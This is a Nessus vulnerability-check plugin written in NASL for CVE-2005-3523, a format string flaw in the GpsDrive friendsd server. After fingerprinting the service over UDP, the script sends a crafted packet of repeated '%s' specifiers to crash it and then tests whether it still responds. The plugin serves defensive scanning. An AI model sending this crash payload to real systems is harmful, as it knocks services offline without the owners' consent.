#
# (C) Tenable Network Security, Inc.
#


include("compat.inc");

if (description) {
  script_id(20159);
  script_version("$Revision: 1.12 $");

  script_cve_id("CVE-2005-3523");
  script_bugtraq_id(15319);
  script_xref(name:"OSVDB", value:"20531");

  script_name(english:"GpsDrive friendsd2 dir Field Remote Format String");
  script_summary(english:"Checks for format string vulnerability in GpsDrive friendsd");
 
 script_set_attribute(attribute:"synopsis", value:
"The remote server is affected by a format string vulnerability." );
 script_set_attribute(attribute:"description", value:
"The remote host is running a GpsDrive friendsd server, which records
the positions of friends on a map. 

The version of friendsd installed on the remote host is affected by a
format string vulnerability.  An attacker can leverage this issue
using a specially-crafted packet to crash the server and possibly
execute code on the remote host subject to the privileges under which
the server runs." );
 script_set_attribute(attribute:"see_also", value:"http://www.nessus.org/u?dabc8c33" );
 script_set_attribute(attribute:"see_also", value:"http://www.nessus.org/u?777cc0de" );
 script_set_attribute(attribute:"solution", value:
"Upgrade to 2.10pre3-cvs or later." );
 script_set_attribute(attribute:"cvss_vector", value: "CVSS2#AV:N/AC:L/Au:N/C:P/I:P/A:P" );
script_end_attributes();


  script_category(ACT_DENIAL);
  script_family(english:"Gain a shell remotely");
  script_copyright(english:"This script is Copyright (C) 2005-2009 Tenable Network Security, Inc.");
  script_require_ports(50123);

  exit(0);
}


include("global_settings.inc");
include("misc_func.inc");


port = 50123;
done = NULL;


# A position report.
args = make_list(
  "POS:",                               # constant => report position
  rand_str(                             # a random ID string
    length:22,
    charset:"abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
  ),
  SCRIPT_NAME,                          # a name
  "39.187362",                          # latitude
  "-76.818423",                         # longitude
  unixtime(),                           # last report (current time)
  "10",                                 # speed
  "90",                                 # direction
  raw_string(0x00)                      # marks end of packet
);
pos = "";
foreach arg (args) {
  pos += arg + " ";
}
pos = chomp(pos);


# Make sure the server is up.
tries = 5;
for (iter = 0; iter < tries; iter++) {
  soc = open_sock_udp(port);

  # Send our position report.
  send(socket:soc, data:pos);

  # Read the response.
  repeat {
    res = recv(socket:soc, length:1024);
    if (isnull(res)) break;

    # If it's the first line...
    if (isnull(done)) {
      # If the first line looks like friendsd, set done=0.
      if (string("$START:$\n") == res) done = 0;
      # Otherwise, it's not friendsd so we're done.
      else {
        close(soc);
        exit(0);
      }
    }
    # If it looks like the last line, set done=1.
    else if (string("$END:$\n") == res) done = 1;
  } until (done);

  close(soc);
  if (done) break;
}
# We're done if we couldn't get a response after several iterations.
if (isnull(done)) exit(0);


# Try to crash the server with a bogus position report.
exploit = str_replace(
  string:pos,
  find:" 90 ",
  replace:"%s%s%s%s%s%s%s%s%s"
);
for (iter = 0; iter < tries; iter++) {
  soc = open_sock_udp(port);

  # Send a position report with a format string.
  send(socket:soc, data:exploit);
}
sleep(1);


# Report a position again to see whether the server is up.
for (iter = 0; iter < tries; iter++) {
  soc = open_sock_udp(port);

  # Send our position report.
  send(socket:soc, data:pos);

  # Read the response.
  repeat {
    res = recv(socket:soc, length:1024);
    if (isnull(res)) break;

    # If it's the first line...
    if (isnull(done)) {
      # If the first line looks like friendsd, set done=0.
      if (string("$START:$\n") == res) done = 0;
      # Otherwise, it's not friendsd so we're done.
      else {
        close(soc);
        exit(0);
      }
    }
    # If it looks like the last line, set done=1.
    else if (string("$END:$\n") == res) done = 1;
  } until (done);

  close(soc);
  if (done) break;
}
# There's a problem if we couldn't get a response after several iterations.
if (isnull(done)) security_hole(port);
